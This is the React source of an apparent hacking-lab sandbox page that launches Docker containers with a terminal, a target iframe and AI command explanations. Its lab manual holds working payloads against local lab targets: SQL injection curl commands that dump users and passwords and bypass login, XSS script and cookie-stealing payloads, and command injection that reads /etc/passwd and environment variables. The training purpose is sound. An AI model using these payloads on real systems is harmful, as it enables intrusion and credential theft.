'use client';

import React, { useState, useEffect, useRef } from 'react';
import { useSearchParams } from 'next/navigation';
import {
  Terminal as TerminalIcon,
  Wifi,
  Server,
  ShieldAlert,
  Command,
  Square,
  Database,
  ChevronDown,
  ChevronRight,
  Info,
  Globe
} from 'lucide-react';
import ReactMarkdown from 'react-markdown';
import { api } from '@/lib/matrix_api';

// Types
interface LogEntry {
  type: 'system' | 'command' | 'output' | 'error' | 'success';
  content: string;
}

interface LabStep {
  cmd: string;
  desc: string;
  details: string;
  type?: 'terminal' | 'browser';
  url?: string;
  field?: string; // Target input field name for auto-fill
  submit?: boolean; // Auto-submit the form after filling
}

interface LabGuide {
  title: string;
  description: string;
  steps: LabStep[];
}

const LAB_GUIDES: Record<string, LabGuide> = {
  // --- SQL Injection (SQLi) ---
  sql_injection: {
    title: "SQL Injection (SQLi) - Terminal Mode",
    description: "Real hackers use the terminal. Use `curl` to extract the entire database without ever opening a browser, then bypass login as a finale.",
    steps: [
      { type: 'terminal', cmd: "curl -s -X POST -d \"username=admin'\" http://localhost:80/login | grep \"Database Error\"", desc: "1. Detect Vulnerability", details: "Fuzz the endpoint. The 'Database Error' confirms SQL injection exists." },
      { type: 'terminal', cmd: "curl -s -X POST -d \"username=' OR '1'='1\" http://localhost:80/login | grep \"Welcome\"", desc: "2. Verify Bypass", details: "Use a Boolean logic bypass. 'Welcome' in the response proves authentication is broken." },
      { type: 'terminal', cmd: "curl -s -X POST -d \"username=' UNION SELECT 1,sqlite_version(),3 --\" http://localhost:80/login | grep \"Welcome back\"", desc: "3. Enumerate Database", details: "Inject a UNION statement to extract the SQLite version from the 'Welcome back' message." },
      { type: 'terminal', cmd: "curl -s -X POST -d \"username=' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master --\" http://localhost:80/login | grep \"Welcome back\"", desc: "4. List Tables", details: "Extract all table names (e.g. 'users, secrets') directly in the terminal." },
      { type: 'terminal', cmd: "curl -s -X POST -d \"username=' UNION SELECT 1,sql,3 FROM sqlite_master WHERE tbl_name='users' --\" http://localhost:80/login | grep \"CREATE TABLE\"", desc: "5. Dump Schema", details: "Read the table structure to find column names like 'password' or 'ssn'." },
      { type: 'terminal', cmd: "curl -s -X POST -d \"username=' UNION SELECT 1,group_concat(username),3 FROM users --\" http://localhost:80/login | grep \"Welcome back\"", desc: "6. Dump Usernames", details: "Extracts all usernames from the users table." },
      { type: 'terminal', cmd: "curl -s -X POST -d \"username=' UNION SELECT 1,group_concat(password),3 FROM users --\" http://localhost:80/login | grep \"Welcome back\"", desc: "7. Dump Passwords", details: "Extracts all hashed passwords." },
      { type: 'terminal', cmd: "curl -s -X POST -d \"username=admin' AND (SELECT length(password))>5 --\" http://localhost:80/login", desc: "8. Blind SQLi Test", details: "Advanced: Test if the admin password is longer than 5 chars (returns Success/Fail)." },
      { type: 'browser', url: '/login', cmd: '', desc: "9. Navigate to Portal", details: "Now that you have the data, open the web interface." },
      { type: 'browser', cmd: "admin' --", field: 'username', submit: true, desc: "10. Visual Bypass (Finale)", details: "Log in as Admin to see the flag on the Secure Dashboard." }
    ]
  },

  // --- Reflected XSS ---
  xss: {
    title: "Reflected XSS - Matrix Comms Relay",
    description: "Infiltrate the secure communication relay. Messages are reflected to all users without sanitization.",
    steps: [
      { type: 'terminal', cmd: "curl -s \"http://localhost:80/xss-lab?msg=<script>alert(1)</script>\" | grep \"<script>\"", desc: "1. Scanner: Check Reflection", details: "Verify that your message is reflected back in the chat window raw." },
      { type: 'terminal', cmd: "curl -I \"http://localhost:80/xss-lab\"", desc: "2. Scanner: Check Headers", details: "Verify Content-Security-Policy is missing." },
      { type: 'browser', url: '/xss-lab', cmd: '', desc: "3. Open Comms Relay", details: "Access the target chat interface." },
      { type: 'browser', cmd: "<script>alert('SYSTEM BREACH')</script>", field: 'msg', submit: true, desc: "4. Proof of Concept", details: "Trigger a standard alert box." },
      { type: 'browser', cmd: "<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:red;opacity:0.5;z-index:999'></div>", field: 'msg', submit: true, desc: "5. Visual Defacement", details: "Overlay a red warning filter over the entire screen." },
      { type: 'browser', cmd: "<script>document.body.innerHTML='<h1 style=\"color:red;margin:20%\">NODE HACKED</h1>'</script>", field: 'msg', submit: true, desc: "6. Denial of Service", details: "Destroy the interface for anyone who views the message." },
      { type: 'browser', cmd: "<img src=x onerror=alert('Stealing_Cookies:'+document.cookie)>", field: 'msg', submit: true, desc: "7. Cookie Theft", details: "Use an image tag to bypass script filters." }
    ]
  },

  // --- Command Injection (RCE) ---
  rce: {
    title: "Command Injection (RCE) - Grid Control",
    description: "Access the Grid Infrastructure Admin Panel. The 'Network Probe' tool behaves suspiciously.",
    steps: [
      { type: 'terminal', cmd: "curl -s \"http://localhost:80/rce-lab?target=127.0.0.1;whoami\" | grep -A 5 \"admin@grid-con\"", desc: "1. Identification (whoami)", details: "Identify the user context of the web server." },
      { type: 'terminal', cmd: "curl -s \"http://localhost:80/rce-lab?target=127.0.0.1;ls%20-la\" | grep -A 20 \"admin@grid-con\"", desc: "2. Filesystem (ls)", details: "List files in the current directory." },
      { type: 'terminal', cmd: "curl -s \"http://localhost:80/rce-lab?target=127.0.0.1;cat%20/etc/passwd\" | grep -A 20 \"root:\"", desc: "3. User Data (passwd)", details: "Read sensitive system files." },
      { type: 'terminal', cmd: "curl -s \"http://localhost:80/rce-lab?target=127.0.0.1;env\" | grep -A 20 \"PATH\"", desc: "4. Environment Dump", details: "Find hidden keys in environment variables." },
      { type: 'browser', url: '/rce-lab', cmd: '', desc: "5. Open Admin Panel", details: "Visual interface for the Grid Control system." },
      { type: 'browser', cmd: "127.0.0.1; ls -la", field: 'target', submit: true, desc: "6. Visual Exploit", details: "Run the exploit in the 'real' dashboard." },
      { type: 'browser', cmd: "127.0.0.1; cat /etc/passwd", field: 'target', submit: true, desc: "7. Exfiltrate Data", details: "Dump user data to the terminal screen." },
      { type: 'browser', cmd: "127.0.0.1; echo 'HACKED' > status.txt; ls", field: 'target', submit: true, desc: "8. Persistence", details: "Leave a permanent mark on the filesystem." }
    ]
  },

  // --- Generic Fallback ---
  generic: {
    title: "General Sandbox",
    description: "A standard environment for testing commands.",
    steps: [
      { type: 'terminal', cmd: "ls -la", desc: "List files", details: "Lists all files in the current directory." },
      { type: 'terminal', cmd: "whoami", desc: "Check current user", details: "Displays the username of the current user." }
    ]
  }
};

const API_BASE = '/api';

// Global State for Connection Management
const activeBuilds = new Map<string, Promise<any>>();
const subscriberCounts = new Map<string, number>();

export default function SandboxPage() {
  const searchParams = useSearchParams();
  const type = searchParams.get('type') || 'generic';
  const id = searchParams.get('id') || 'unknown';

  const [sessionId, setSessionId] = useState<string | null>(null);
  const [containerId, setContainerId] = useState<string | null>(null);
  const [targetUrl, setTargetUrl] = useState<string | null>(null);
  const [status, setStatus] = useState<'idle' | 'connecting' | 'connected' | 'error'>('idle');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [input, setInput] = useState('');
  const endRef = useRef<HTMLDivElement>(null);
  const iframeRef = useRef<HTMLIFrameElement>(null); // Ref for iframe communication

  // UI State for Resize
  const [leftWidth, setLeftWidth] = useState(55); // % width of terminal
  const [rightSplit, setRightSplit] = useState(60); // % height of browser in right panel
  const [isDraggingLeft, setIsDraggingLeft] = useState(false);
  const [isDraggingRight, setIsDraggingRight] = useState(false);

  // State for manual accordion
  const [openStepIndex, setOpenStepIndex] = useState<number | null>(null);

  // State for explanation
  const [explanation, setExplanation] = useState<string | null>(null);
  const [isExplaining, setIsExplaining] = useState(false);
  const [explainingCmd, setExplainingCmd] = useState<string | null>(null);

  // Ref for reliable cleanup access
  const containerIdRef = useRef<string | null>(null);

  // Keep ref in sync with state
  useEffect(() => {
    containerIdRef.current = containerId;
  }, [containerId]);

  const handleExplain = async (cmd: string) => {
    console.log("Explaining command:", cmd);
    setIsExplaining(true);
    setExplainingCmd(cmd);
    setExplanation(null); // Clear previous

    try {
      const res = await api.explainExploitCommandV2(cmd);
      setExplanation(res.explanation);
    } catch (err) {
      console.error("Failed to explain:", err);
      setExplanation("Error: Could not generate explanation.");
    } finally {
      setIsExplaining(false);
    }
  };

  const handleExplainOutput = async (context: 'terminal' | 'browser') => {
    setIsExplaining(true);
    setExplainingCmd(context === 'terminal' ? "Terminal Output" : "Page Content");
    setExplanation(null);

    try {
      let contentToExplain = "";
      let lastCommand = "";

      if (context === 'terminal') {
        // Find the last executed command index
        let lastCmdIndex = -1;
        for (let i = logs.length - 1; i >= 0; i--) {
          if (logs[i].type === 'command') {
            lastCmdIndex = i;
            lastCommand = logs[i].content.replace('root@sandbox:~# ', '');
            break;
          }
        }

        if (lastCmdIndex !== -1) {
          // Gather all logs AFTER the command (the output)
          contentToExplain = logs.slice(lastCmdIndex + 1)
            .map(l => l.content)
            .join('\n');
        } else {
          contentToExplain = logs.map(l => l.content).join('\n'); // Fallback: everything
        }
      } else {
        // Browser context
        if (iframeRef.current?.contentDocument?.body) {
          contentToExplain = iframeRef.current.contentDocument.body.innerText;
        } else {
          throw new Error("Cannot access page content. Is the sandbox running?");
        }
      }

      if (!contentToExplain.trim()) {
        setExplanation("No output found to analyze.");
        return;
      }

      const res = await api.explainExploitOutput(contentToExplain, context, lastCommand);
      setExplanation(res.explanation);
    } catch (err: any) {
      console.error("Failed to explain output:", err);
      setExplanation(`Error: ${err.message || "Could not analyze output."}`);
    } finally {
      setIsExplaining(false);
    }
  };

  const closeExplanation = () => {
    setExplanation(null);
    setExplainingCmd(null);
  };
  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const addLog = (msg: string, type: LogEntry['type'] = 'system') => {
    setLogs(prev => [...prev, { type, content: msg }]);
  };

  const toggleStep = (index: number) => {
    setOpenStepIndex(openStepIndex === index ? null : index);
  };

  // Initialize Sandbox
  useEffect(() => {
    if (!type || !id) return;
    const currentCount = (subscriberCounts.get(id) || 0) + 1;
    subscriberCounts.set(id, currentCount);

    let mounted = true;

    const initSandbox = async () => {
      setStatus('connecting');
      let promise = activeBuilds.get(id);
      if (!promise) {
        promise = (async () => {
          addLog(`Checking Docker availability...`);
          const dockerStatus = await api.checkDockerStatus();
          if (dockerStatus.status !== 'available') {
            throw new Error(`Docker service not available: ${dockerStatus.detail || 'Unknown error'}`);
          }
          addLog(`Initializing Sandbox Environment for: ${type.toUpperCase()}...`);
          return await api.startExploitSandbox(type, id);
        })();
        activeBuilds.set(id, promise);
      }

      try {
        const data = await promise;
        if (mounted) {
          setSessionId(data.session_id);
          setContainerId(data.container_id);

          let labPath = '';
          if (type === 'xss') labPath = '/xss-lab';
          else if (type === 'rce') labPath = '/rce-lab';

          setTargetUrl(data.url + labPath);
          setStatus('connected');
          addLog(`Success! Container started.`);
          addLog(`ID: ${data.container_id.substring(0, 12)}`);
          addLog(`Target: ${data.url + labPath}`);
          addLog(`Connection established via secure tunnel.`);
          addLog(`> Ready for input. Type 'help' for commands.`);

          const guide = LAB_GUIDES[type as keyof typeof LAB_GUIDES];
          if (guide) {
            addLog(`\n=== ${guide.title} ===`);
            addLog(`${guide.description}`);
            addLog(`Refer to the Lab Manual on the right for commands.\n`);
          }
        }
      } catch (err: any) {
        if (mounted) {
          setStatus('error');
          addLog(`ERROR: ${err.message || "Backend failed to start container."}`, 'error');
        }
        activeBuilds.delete(id);
      }
    };

    if (status === 'idle') initSandbox();

    return () => {
      mounted = false;
      const newCount = (subscriberCounts.get(id) || 0) - 1;
      subscriberCounts.set(id, newCount);
      // Removed the delayed cleanup logic here to avoid race conditions.
      // We strictly rely on explicit terminate or beforeunload now.
    };
  }, [type, id]);

  // Heartbeat Mechanism
  useEffect(() => {
    if (!containerId || status !== 'connected') return;

    const interval = setInterval(() => {
      api.sendHeartbeat(containerId).catch(console.error);
    }, 5000); // Ping every 5 seconds

    return () => clearInterval(interval);
  }, [containerId, status]);

  const cleanupSession = () => {
    const cid = containerIdRef.current;
    if (!cid) return;

    const url = `${API_BASE}/exploit/stop/${cid}`;

    // 1. Try Beacon (Reliable on Unload)
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify({})], { type: 'application/json' });
      const success = navigator.sendBeacon(url, blob);
      if (success) return;
    }

    // 2. Fallback to Fetch with Keepalive
    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      keepalive: true,
      body: JSON.stringify({})
    }).catch(err => console.error("Cleanup fetch failed:", err));
  };

  useEffect(() => {
    const handleUnload = () => {
      cleanupSession();
    };

    window.addEventListener('beforeunload', handleUnload);
    // Also handle visibility change (mobile/tab switching sometimes)
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') {
        // Optional: Do we want to kill on hide? Maybe not, user might switch tabs. 
        // Keeping it strictly on unload for now.
      }
    });

    return () => {
      window.removeEventListener('beforeunload', handleUnload);
      cleanupSession(); // Clean up when component unmounts
    };
  }, []); // Empty dependency array because we use ref

  const terminateSession = async () => {
    if (!containerId) return;
    try {
      setStatus('idle');
      addLog("Terminating session...", 'command');
      await api.stopExploitSandbox(containerId);
      addLog("Container stopped successfully.", 'success');
    } catch (e: any) {
      addLog(`Error stopping container: ${e.message}`, 'error');
      // Fallback cleanup
      cleanupSession();
    } finally {
      setSessionId(null);
      setContainerId(null);
      activeBuilds.delete(id);
    }
  };

  const handleCommand = async (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      const cmd = input.trim();
      if (!cmd) return;
      setInput('');
      setLogs(prev => [...prev, { type: 'command', content: `root@sandbox:~# ${cmd}` }]);
      if (cmd === 'clear') { setLogs([]); return; }
      if (cmd === 'help') {
        setLogs(prev => [...prev,
        { type: 'output', content: "Available Commands:" },
        { type: 'output', content: "  ls            List files" },
        { type: 'output', content: "  cat [file]    View file content" },
        { type: 'output', content: "  curl [url]    Make HTTP request" },
        { type: 'output', content: "  ps            List processes" },
        { type: 'output', content: "  env           Show environment variables" },
        { type: 'output', content: "  exit          Close session" }
        ]);
        return;
      }
      if (cmd === 'exit') { terminateSession(); return; }
      if (status !== 'connected' || !containerId) {
        addLog("Error: Not connected to sandbox.", 'error');
        return;
      }
      try {
        const data = await api.executeExploitCommand(containerId, cmd);
        (data.output || "").split('\n').forEach((line: string) => {
          setLogs(prev => [...prev, { type: 'output', content: line }]);
        });
      } catch (e: any) {
        addLog(`Execution Error: ${e.message}`, 'error');
      }
    }
  };

  return (
    <div className="h-screen w-full flex flex-col overflow-hidden bg-black text-emerald-500 font-mono">

      {/* Fixed Header */}
      <header className="flex-none h-16 border-b border-emerald-900 p-4 flex items-center justify-between bg-black z-10">
        <div className="flex items-center gap-4">
          <ShieldAlert className="w-8 h-8 text-emerald-500" />
          <div>
            <h1 className="text-xl font-bold tracking-wider">MATRIX SANDBOX ENVIRONMENT</h1>
            <p className="text-xs text-emerald-700">SESSION: {sessionId || 'INITIALIZING...'}</p>
          </div>
        </div>
        <div className="flex items-center gap-6 text-sm">
          <div className="flex items-center gap-2">
            <Wifi className={`w-4 h-4 ${status === 'connected' ? 'text-emerald-500' : 'text-red-500'}`} />
            <span>{status.toUpperCase()}</span>
          </div>
          <div className="flex items-center gap-2">
            <Server className="w-4 h-4" />
            <span>{type.toUpperCase()} LAB</span>
          </div>
        </div>
      </header>

      {/* Main Content Area - Resizable Split View */}
      <main
        className="flex-1 flex overflow-hidden p-6 relative z-0"
        onMouseMove={(e) => {
          if (isDraggingLeft) {
            const newWidth = (e.clientX / window.innerWidth) * 100;
            if (newWidth > 20 && newWidth < 80) setLeftWidth(newWidth);
          }
          if (isDraggingRight) {
            const headerHeight = 64;
            const relativeY = e.clientY - headerHeight - 24;
            const availableHeight = window.innerHeight - headerHeight - 90; // approx footer + margins
            const newSplit = (relativeY / availableHeight) * 100;
            if (newSplit > 20 && newSplit < 80) setRightSplit(newSplit);
          }
        }}
        onMouseUp={() => {
          setIsDraggingLeft(false);
          setIsDraggingRight(false);
        }}
        onMouseLeave={() => {
          setIsDraggingLeft(false);
          setIsDraggingRight(false);
        }}
      >

        {/* Left Panel: Terminal (Attacker) */}
        <div
          className="flex flex-col min-w-0 bg-black border border-emerald-900 rounded-lg overflow-hidden shadow-lg shadow-emerald-900/10"
          style={{ width: `${leftWidth}%` }}
        >
          <div className="flex-none h-10 border-b border-emerald-900 bg-[#111] flex items-center px-4 gap-2">
            <div className="flex gap-1.5">
              <div className="w-3 h-3 rounded-full bg-red-500/20 border border-red-500/50" />
              <div className="w-3 h-3 rounded-full bg-yellow-500/20 border border-yellow-500/50" />
              <div className="w-3 h-3 rounded-full bg-emerald-500/20 border border-emerald-500/50" />
            </div>
            <div className="flex-1 text-center text-xs text-emerald-800 font-mono">root@kali:~</div>
            <button
              onClick={() => handleExplainOutput('terminal')}
              className="px-2 py-0.5 text-[10px] bg-emerald-900/20 text-emerald-400 border border-emerald-800/50 rounded hover:bg-emerald-800/40 transition-colors flex items-center gap-1"
              title="Analyze the output of the last command"
            >
              <span>✨</span> Analyze Output
            </button>
          </div>

          <div
            className="flex-1 overflow-y-auto p-4 custom-scrollbar font-mono text-base leading-relaxed bg-black"
            onClick={() => document.getElementById('term-input')?.focus()}
          >
            {logs.map((line, i) => (
              <div key={i} className={`mb-1 break-words whitespace-pre-wrap ${line.type === 'error' ? 'text-red-500' : line.type === 'command' ? 'text-emerald-300 font-bold mt-2' : 'text-emerald-500'}`}>
                {line.content}
              </div>
            ))}

            {status === 'connected' && (
              <div className="flex items-center gap-2 mt-2 text-emerald-400">
                <span className="font-bold shrink-0">root@sandbox:~#</span>
                <div className="relative flex-1">
                  <input
                    id="term-input"
                    type="text"
                    className="w-full bg-black outline-none border-none text-emerald-300 font-bold p-0 text-base"
                    value={input}
                    onChange={e => setInput(e.target.value)}
                    onKeyDown={handleCommand}
                    autoFocus
                    autoComplete="off"
                    spellCheck="false"
                  />
                  {input.length === 0 && <span className="absolute left-0 top-1 animate-pulse bg-emerald-500 w-2.5 h-5"></span>}
                </div>
              </div>
            )}
            <div ref={endRef} />
          </div>
        </div>

        {/* Horizontal Resizer (Left vs Right) */}
        <div
          className="w-4 hover:bg-emerald-500/20 cursor-col-resize flex items-center justify-center group transition-colors z-10"
          onMouseDown={() => setIsDraggingLeft(true)}
        >
          <div className="w-1 h-8 bg-emerald-900/50 rounded-full group-hover:bg-emerald-500/50 transition-colors" />
        </div>

        {/* Right Panel: Target & Manual */}
        <div
          className="flex-1 flex flex-col min-w-0"
          style={{ width: `${100 - leftWidth}%` }}
        >

          {/* Top Right: Live Browser Preview (Target) */}
          <div
            className="flex flex-col bg-black border border-emerald-900 rounded-lg overflow-hidden relative shadow-lg shadow-emerald-900/10"
            style={{ height: `${rightSplit}%` }}
          >
            {/* Fake Browser Toolbar */}
            <div className="flex-none h-12 border-b border-emerald-900 bg-[#111] flex items-center px-3 gap-3">
              <div className="flex gap-1">
                <div className="w-2.5 h-2.5 rounded-full bg-red-500/40" />
                <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/40" />
                <div className="w-2.5 h-2.5 rounded-full bg-green-500/40" />
              </div>
              <div className="flex-1 bg-black border border-emerald-900/50 rounded flex items-center px-3 py-1.5 text-xs text-emerald-600 font-mono overflow-hidden">
                <Globe className="w-3 h-3 mr-2 text-emerald-700" />
                {targetUrl || 'about:blank'}
              </div>
            </div>

            {/* Browser Content */}
            <div className="flex-1 bg-white relative">
              {status === 'connected' && targetUrl ? (
                <iframe
                  ref={iframeRef}
                  src={targetUrl}
                  className="w-full h-full border-none"
                  title="Target Preview"
                  sandbox="allow-forms allow-scripts allow-same-origin"
                />
              ) : (
                <div className="absolute inset-0 flex items-center justify-center bg-[#050505] text-emerald-800 font-mono text-sm">
                  {status === 'connecting' ? 'Establishing secure tunnel...' : 'Waiting for connection...'}
                </div>
              )}

              <div className="absolute top-2 right-2 bg-emerald-500 text-black text-[10px] uppercase font-bold px-2 py-0.5 rounded shadow z-10">
                LIVE TARGET
              </div>
            </div>
          </div>

          {/* Vertical Resizer (Browser vs Manual) */}
          <div
            className="h-4 hover:bg-emerald-500/20 cursor-row-resize flex items-center justify-center group transition-colors z-10"
            onMouseDown={() => setIsDraggingRight(true)}
          >
            <div className="w-8 h-1 bg-emerald-900/50 rounded-full group-hover:bg-emerald-500/50 transition-colors" />
          </div>

          {/* Bottom Right: Lab Manual (Instructions) */}
          <div
            className="flex-1 flex flex-col bg-black border border-emerald-900 rounded-lg overflow-hidden"
            style={{ height: `${100 - rightSplit}%` }}
          >
            <div className="flex-none p-3 border-b border-emerald-900 bg-[#111]">
              <div className="flex items-center gap-2 text-emerald-400 font-bold mb-1">
                <Database className="w-4 h-4" />
                <span className="font-sans tracking-wide text-sm">LAB MANUAL</span>
              </div>
              <h3 className="text-base font-bold text-white font-serif-display">
                {LAB_GUIDES[type as keyof typeof LAB_GUIDES]?.title || 'Unknown Lab'}
              </h3>
            </div>

            <div className="flex-1 overflow-y-auto p-4 custom-scrollbar space-y-4 bg-black">
              <div className="p-3 rounded-lg border border-emerald-900/50 bg-[#050505]">
                <p className="text-sm text-emerald-400 leading-relaxed font-sans">
                  {LAB_GUIDES[type as keyof typeof LAB_GUIDES]?.description}
                </p>
              </div>

              <div className="space-y-3">
                {LAB_GUIDES[type as keyof typeof LAB_GUIDES]?.steps.map((step, i) => (
                  <div key={i} className="group border border-emerald-900/30 rounded-lg overflow-hidden transition-all duration-200 bg-[#050505]">
                    <div
                      className="p-3 hover:bg-emerald-900/20 transition-colors cursor-pointer"
                      onClick={() => toggleStep(i)}
                    >
                      <div className="flex justify-between items-start mb-2">
                        <div className="flex items-center gap-2">
                          <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded uppercase tracking-wider border ${step.type === 'browser' ? 'text-blue-400 border-blue-900/50 bg-blue-900/20' : 'text-emerald-600 border-emerald-900/50'}`}>
                            {step.type === 'browser' ? 'BROWSER' : 'TERMINAL'} {i + 1}
                          </span>
                        </div>
                        {openStepIndex === i ? <ChevronDown className="w-4 h-4 text-emerald-500" /> : <ChevronRight className="w-4 h-4 text-emerald-500/50" />}
                      </div>
                      <p className="text-sm font-medium text-emerald-200 mb-2 font-sans">{step.desc}</p>

                      <div
                        className={`relative p-2.5 rounded border font-mono text-xs break-all cursor-pointer transition-all group-hover/cmd flex items-center gap-2 ${step.type === 'browser'
                          ? 'bg-blue-950/20 border-blue-900/30 text-blue-300 hover:border-blue-500 hover:bg-blue-900/30'
                          : 'bg-black border-emerald-900/50 text-emerald-300 hover:border-emerald-500 hover:bg-emerald-900/30'
                          }`}
                        onClick={(e) => {
                          e.stopPropagation();
                          if (step.type === 'browser') {
                            if (step.url) {
                              // Navigate Iframe
                              if (targetUrl) {
                                try {
                                  const baseUrl = new URL(targetUrl).origin;
                                  setTargetUrl(`${baseUrl}${step.url}`);
                                } catch (e) { console.error("Invalid URL", e); }
                              }
                            } else if (step.cmd) {
                              // Auto-Fill Payload
                              if (iframeRef.current && iframeRef.current.contentWindow) {
                                const sendMessage = () => {
                                  if (iframeRef.current?.contentWindow) {
                                    iframeRef.current.contentWindow.postMessage({
                                      action: 'fill-input',
                                      field: step.field, // Pass the target field name
                                      payload: step.cmd,
                                      submit: step.submit // Auto-submit flag
                                    }, '*');
                                  }
                                };

                                // Send immediately and retry to catch iframe loading states
                                sendMessage();
                                setTimeout(sendMessage, 500);
                                setTimeout(sendMessage, 1500);

                                // Visual feedback
                                const el = e.currentTarget;
                                el.style.backgroundColor = 'rgba(59, 130, 246, 0.5)';
                                setTimeout(() => el.style.backgroundColor = '', 300);
                              }
                            }
                          } else {
                            // Terminal Command
                            setInput(step.cmd);
                            document.getElementById('term-input')?.focus();
                          }
                        }}
                        title={step.type === 'browser' ? (step.url ? "Click to Navigate" : "Click to Auto-Fill Payload") : "Click to Paste to Terminal"}
                      >
                        {step.type === 'browser' ? (
                          step.url ? <Globe className="w-3 h-3 text-blue-500 shrink-0" /> : <Command className="w-3 h-3 text-blue-500 shrink-0" />
                        ) : (
                          <div className="w-3 h-3" /> // Spacer or Terminal icon
                        )}

                        <span className="flex-1">{step.url ? `Go to ${step.url}` : step.cmd || "No payload"}</span>

                        <div className="opacity-0 group-hover/cmd:opacity-100 transition-opacity">
                          {step.type === 'browser' ? (
                            step.url ? <ChevronRight className="w-3 h-3 text-blue-500" /> : <span className="text-[10px] text-blue-500 font-bold">FILL</span>
                          ) : (
                            <Command className="w-3 h-3 text-emerald-500" />
                          )}
                        </div>
                      </div>

                      {/* Explain with AI Button */}
                      {step.type === 'terminal' && (
                        <button
                          type="button"
                          onClick={(e) => {
                            e.preventDefault();
                            e.stopPropagation();
                            handleExplain(step.cmd || '');
                          }}
                          className="mt-2 w-full text-[10px] bg-emerald-900/20 hover:bg-emerald-800/40 text-emerald-400 border border-emerald-800/30 px-2 py-1.5 rounded flex items-center justify-center gap-1.5 transition-colors group/ai"
                        >
                          <span className="text-emerald-500 group-hover/ai:scale-110 transition-transform">✨</span> Explain with AI
                        </button>
                      )}

                    </div>

                    {openStepIndex === i && (
                      <div className="px-4 py-3 bg-[#111] border-t border-emerald-900/30 animate-in slide-in-from-top-2 duration-200">
                        <div className="flex gap-2">
                          <Info className="w-4 h-4 text-emerald-500/60 shrink-0 mt-0.5" />
                          <p className="text-xs text-emerald-300 leading-relaxed font-sans">
                            {step.details}
                          </p>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </main>

      {explanation && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 sm:p-6" onClick={closeExplanation}>
          <div
            className="bg-[#0a0a0a] border border-emerald-500/30 rounded-lg max-w-2xl w-full shadow-2xl shadow-emerald-900/20 overflow-hidden flex flex-col max-h-[85vh]"
            onClick={e => e.stopPropagation()}
          >
            {/* Header */}
            <div className="flex-none flex items-center justify-between p-4 border-b border-emerald-900/50 bg-[#111]">
              <h3 className="text-emerald-400 font-bold flex items-center gap-2">
                <span className="text-lg">🤖</span> AI Command Analysis
              </h3>
              <button onClick={closeExplanation} className="text-emerald-500/50 hover:text-emerald-400 p-1 hover:bg-emerald-900/30 rounded transition-colors">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18" /><path d="m6 6 12 12" /></svg>
              </button>
            </div>

            {/* Scrollable Content */}
            <div className="flex-1 overflow-y-auto p-6 bg-[#050505] custom-scrollbar">
              <div className="mb-4 font-mono text-xs bg-black border border-emerald-900/50 p-3 rounded text-emerald-300 overflow-x-auto shadow-inner shadow-emerald-900/10">
                <strong>Command context:</strong> {explainingCmd}
              </div>
              <div className="prose prose-invert prose-emerald prose-sm max-w-none">
                <ReactMarkdown
                  components={{
                    h3: ({ node, ...props }) => <h3 className="text-emerald-400 font-bold text-lg mt-6 mb-3 flex items-center gap-2 border-b border-emerald-900/30 pb-2" {...props} />,
                    strong: ({ node, ...props }) => <strong className="text-emerald-300 font-bold bg-emerald-900/20 px-1 rounded" {...props} />,
                    ul: ({ node, ...props }) => <ul className="list-disc pl-5 space-y-2 text-emerald-100/80 my-4" {...props} />,
                    li: ({ node, ...props }) => <li className="leading-relaxed pl-1" {...props} />,
                    p: ({ node, ...props }) => <p className="mb-4 leading-relaxed text-emerald-100/90 text-sm" {...props} />,
                    code: ({ node, ...props }) => <code className="bg-black border border-emerald-900/50 text-emerald-300 px-1.5 py-0.5 rounded font-mono text-xs shadow-sm" {...props} />,
                    pre: ({ node, ...props }) => <pre className="bg-black border border-emerald-900/50 p-4 rounded-lg overflow-x-auto my-4 text-xs shadow-inner" {...props} />,
                  }}
                >
                  {explanation}
                </ReactMarkdown>
              </div>
            </div>

            {/* Footer */}
            <div className="flex-none p-4 border-t border-emerald-900/50 bg-[#111] flex justify-end shadow-up">
              <button
                onClick={closeExplanation}
                className="px-6 py-2 bg-emerald-900/30 hover:bg-emerald-800/50 text-emerald-400 rounded text-sm transition-all border border-emerald-800/30 hover:border-emerald-500/50 hover:shadow-lg hover:shadow-emerald-900/20"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Loading Overlay */}
      {isExplaining && (
        <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center">
          <div className="bg-black border border-emerald-500/50 px-6 py-4 rounded-lg flex items-center gap-3 shadow-xl">
            <div className="w-5 h-5 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin"></div>
            <span className="text-emerald-400 font-mono text-sm">Analyzing command with AI...</span>
          </div>
        </div>
      )}

      {/* Fixed Footer */}
      <footer className="flex-none h-16 border-t border-emerald-900 p-4 flex items-center justify-end gap-4 bg-black z-10">
        <button
          onClick={() => window.location.reload()}
          className="flex items-center gap-2 px-4 py-2 rounded-lg bg-emerald-900/30 text-emerald-400 border border-emerald-900/50 hover:bg-emerald-900/50 hover:text-emerald-300 transition-all text-xs font-bold tracking-wide"
        >
          <Command className="w-4 h-4" /> RESET TERMINAL
        </button>
        <button
          onClick={() => { terminateSession(); window.close(); }}
          className="flex items-center gap-2 px-6 py-2 rounded-lg bg-red-900/30 text-red-500 border border-red-900/50 hover:bg-red-900/50 hover:text-red-400 transition-all text-xs font-bold tracking-wide"
        >
          <Square className="w-4 h-4 fill-current" /> TERMINATE SESSION
        </button>
      </footer>

      <style jsx global>{`
        .custom-scrollbar::-webkit-scrollbar { width: 8px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: #000; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #064e3b; border-radius: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #047857; }
      `}</style>
    </div>
  );
}
